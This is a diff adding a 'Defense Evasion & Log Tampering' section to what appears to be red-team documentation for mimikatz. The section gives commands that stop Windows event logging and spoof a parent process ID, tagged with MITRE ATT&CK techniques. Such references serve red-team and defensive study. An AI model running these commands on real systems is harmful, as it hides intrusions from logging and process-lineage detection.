@@ -171,6 +171,27 @@ The `misc` module includes helper functions that may assist in bypassing applica
 
 ## Defense Evasion & Log Tampering
 
+<Steps>
+  <Step title="Drop Event Generation">
+    Interferes with event logging generation to hide subsequent actions.
+
+    ```bash
+    mimikatz # event::drop
+    ```
+  </Step>
+  <Step title="Parent PID Spoofing">
+    **MITRE ATT&CK:** [T1134.004](https://attack.mitre.org/techniques/T1134/004/) Creates a process with a spoofed parent PID to evade behavioral detections based on process lineage.
+
+    ```bash
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # process::runp /run:"powershell.exe" /ppid:5828
+    ```
+
+    _Note: If_ `/ppid `_is not specified, default parent may be_ `lsass.exe`_._
+  </Step>
+</Steps>
+
 <Danger>
 **MITRE ATT&CK:** [T1070/001](https://attack.mitre.org/techniques/T1070/001) | [T1134/004](https://attack.mitre.org/techniques/T1134/004/)
 </Danger>
